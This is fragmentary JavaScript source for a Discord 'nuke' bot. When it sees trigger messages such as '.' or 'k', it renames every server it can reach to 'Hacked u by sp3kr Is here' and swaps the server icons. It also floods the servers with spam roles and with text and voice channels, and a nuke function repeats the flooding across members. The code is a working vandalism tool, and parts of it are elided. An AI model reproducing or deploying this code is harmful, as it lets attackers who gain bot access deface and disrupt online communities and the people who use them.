...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked u by sp3kr Is here`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://www.gstatic.com/allo/stickers/pack-880803/v2/xxhdpi/1.gif`)
})
}
});
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setName(`Hacked u by sp3kr Is here`)
})
}
});
...
LOka.on('message', message => {
     if (message.content === ".") {
             ...
             message.guild.setIcon(`https://www.gstatic.com/allo/stickers/pack-880803/v2/xxhdpi/1.gif`)
...
LOka.on('message', message => {
     ...
     if (message.content === "k1") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by sp3kr Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
    ...
    m.createRole({
        name : "Hacked u by sp3krn Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
...
LOka.on('message', message => {
         if (message.content === "k") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by sp3kr Is here', 'text');
m.createChannel('Hacked u by sp3kr Is here', 'text');
m.createChannel('Hacked u by sp3kr Is here', 'text');
m.createChannel('Hacked u by sp3kr Is here', 'text');
m.createChannel('Hacked u by sp3kr Is here', 'text');
...
LOka.on('message', message => {
         if (message.content === "k") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by sp3kr Is here', 'voice');
m.createChannel('Hacked u by sp3kr Is here', 'voice');
m.createChannel('Hacked u by sp3kr Is here', 'voice');
m.createChannel('Hacked u by sp3kr Is here', 'voice');
m.createChannel('Hacked u by sp3kr Is here', 'voice');
...
async function nuke(guild) {
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('Hacked u by sp3kr Is here', 'text');

      await guild.createChannel('Hacked u by sp3kr Is here', 'voice');
